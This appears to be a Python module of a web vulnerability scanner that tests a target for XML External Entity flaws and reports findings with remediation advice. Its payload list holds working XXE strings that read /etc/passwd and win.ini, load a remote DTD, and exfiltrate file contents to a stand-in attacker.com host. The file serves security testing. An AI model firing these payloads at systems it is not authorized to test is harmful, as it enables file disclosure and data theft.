"""XXE (XML External Entity) vulnerability scanner."""
from typing import List
from loguru import logger

from src.scanner.base_scanner import BaseScanner
from src.scanner.models import Vulnerability, Severity


class XXEScanner(BaseScanner):
    """Scanner for XML External Entity vulnerabilities."""
    
    XXE_PAYLOADS = [
        # Basic XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        
        # XXE with parameter entity
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo></foo>',
        
        # Blind XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://attacker.com/?%xxe;\'>">%param1;]><foo>&exfil;</foo>',
    ]
    
    def scan(self) -> List[Vulnerability]:
        """Scan for XXE vulnerabilities."""
        logger.info(f"Starting XXE scan on {self.target}")
        vulnerabilities = []
        
        for payload in self.XXE_PAYLOADS:
            response = self.http_request(
                "POST",
                headers={"Content-Type": "application/xml"},
                data=payload
            )
            
            if response and self._is_xxe_vulnerable(response):
                vuln = self.create_vulnerability(
                    vuln_type="xxe",
                    title="XML External Entity (XXE) Injection",
                    description="Application processes XML input with external entities enabled, allowing file disclosure and SSRF attacks.",
                    severity=Severity.HIGH,
                    location=self.target,
                    payload=payload[:200],
                    cvss_score=8.5,
                    cwe_id="CWE-611",
                    steps_to_reproduce=[
                        "1. Send XML payload with external entity",
                        "2. Observe file contents or external entity resolution in response",
                    ],
                    remediation="Disable XML external entity processing. Use safe XML parsers. Validate and sanitize XML input.",
                    references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
                    evidence=response.text[:500]
                )
                vulnerabilities.append(vuln)
                logger.warning("Found XXE vulnerability")
                break
        
        return vulnerabilities
    
    def _is_xxe_vulnerable(self, response) -> bool:
        """Check if XXE payload was successful."""
        indicators = ["root:x:", "[fonts]", "bin:", "daemon:"]
        return any(ind in response.text for ind in indicators)
